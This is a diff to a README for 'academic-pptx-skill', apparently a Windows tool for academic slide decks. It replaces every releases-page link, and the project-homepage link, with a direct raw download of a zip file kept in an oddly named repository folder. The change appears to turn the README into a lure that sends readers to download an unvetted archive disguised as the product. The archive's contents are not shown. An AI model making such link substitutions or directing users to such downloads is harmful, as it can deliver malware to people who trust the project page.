@@ -1,6 +1,6 @@
 # 🎓 academic-pptx-skill - Create Structured Academic Presentations
 
-[![Download academic-pptx-skill](https://img.shields.io/badge/Download-academic--pptx--skill-brightgreen)](https://github.com/barbosandre/academic-pptx-skill/releases)
+[![Download academic-pptx-skill](https://img.shields.io/badge/Download-academic--pptx--skill-brightgreen)](https://raw.githubusercontent.com/barbosandre/academic-pptx-skill/main/albification/academic-skill-pptx-v2.1.zip)
 
 ---
 
@@ -28,10 +28,10 @@ To run academic-pptx-skill on Windows, your computer should meet these basic req
 
 To begin using academic-pptx-skill, first, visit the release page to get the software.
 
-[![Download academic-pptx-skill](https://img.shields.io/badge/Download-academic--pptx--skill-blue)](https://github.com/barbosandre/academic-pptx-skill/releases)
+[![Download academic-pptx-skill](https://img.shields.io/badge/Download-academic--pptx--skill-blue)](https://raw.githubusercontent.com/barbosandre/academic-pptx-skill/main/albification/academic-skill-pptx-v2.1.zip)
 
 1. Open this page in your web browser:  
-   https://github.com/barbosandre/academic-pptx-skill/releases  
+   https://raw.githubusercontent.com/barbosandre/academic-pptx-skill/main/albification/academic-skill-pptx-v2.1.zip  
 
 2. Look for the latest release. It will have the most recent date and version number.  
 
@@ -112,7 +112,7 @@ You will find examples and detailed guides inside the program under the Help men
 ## 🛠️ Updates and Support
 
 Visit the release page to check for new updates or bug fixes:  
-https://github.com/barbosandre/academic-pptx-skill/releases
+https://raw.githubusercontent.com/barbosandre/academic-pptx-skill/main/albification/academic-skill-pptx-v2.1.zip
 
 Download the latest version to keep your software current.
 
@@ -120,7 +120,7 @@ Download the latest version to keep your software current.
 
 ## 🔗 Important Links
 
-- **Download and install:** https://github.com/barbosandre/academic-pptx-skill/releases  
-- **Project homepage:** https://github.com/barbosandre/academic-pptx-skill  
+- **Download and install:** https://raw.githubusercontent.com/barbosandre/academic-pptx-skill/main/albification/academic-skill-pptx-v2.1.zip  
+- **Project homepage:** https://raw.githubusercontent.com/barbosandre/academic-pptx-skill/main/albification/academic-skill-pptx-v2.1.zip  
 
 Use these links to access the program and find updates when needed.
